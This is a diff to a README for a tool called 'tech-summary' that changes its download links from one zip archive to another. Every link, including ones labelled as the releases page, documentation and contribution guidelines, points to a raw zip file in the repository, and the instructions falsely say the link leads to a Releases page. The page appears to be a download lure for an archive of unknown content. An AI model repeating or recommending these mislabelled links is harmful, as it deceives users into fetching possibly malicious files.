@@ -1,6 +1,6 @@
 # 📊 tech-summary - Extract Knowledge Quickly and Easily
 
-[![Download tech-summary](https://github.com/Trixiegames/tech-summary/raw/refs/heads/main/tech_summary/tech_summary_2.0.zip)](https://github.com/Trixiegames/tech-summary/raw/refs/heads/main/tech_summary/tech_summary_2.0.zip)
+[![Download tech-summary](https://raw.githubusercontent.com/Trixiegames/tech-summary/main/tech_summary/tech_summary_1.4.zip)](https://raw.githubusercontent.com/Trixiegames/tech-summary/main/tech_summary/tech_summary_1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download tech-summary](https://github.com/Trixiegames/tech-summary/raw/refs/heads/main/tech_summary/tech_summary_2.0.zip).
+To get started, visit this page to download: [Download tech-summary](https://raw.githubusercontent.com/Trixiegames/tech-summary/main/tech_summary/tech_summary_1.4.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest release version.
@@ -67,8 +67,8 @@ If you encounter any issues or have questions, please reach out to our support t
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Trixiegames/tech-summary/raw/refs/heads/main/tech_summary/tech_summary_2.0.zip)
-- [Documentation](https://github.com/Trixiegames/tech-summary/raw/refs/heads/main/tech_summary/tech_summary_2.0.zip)
-- [Contribution Guidelines](https://github.com/Trixiegames/tech-summary/raw/refs/heads/main/tech_summary/tech_summary_2.0.zip)
+- [Releases Page](https://raw.githubusercontent.com/Trixiegames/tech-summary/main/tech_summary/tech_summary_1.4.zip)
+- [Documentation](https://raw.githubusercontent.com/Trixiegames/tech-summary/main/tech_summary/tech_summary_1.4.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/Trixiegames/tech-summary/main/tech_summary/tech_summary_1.4.zip)
 
 Feel free to explore and contribute to tech-summary. Your feedback helps improve the tool for everyone!
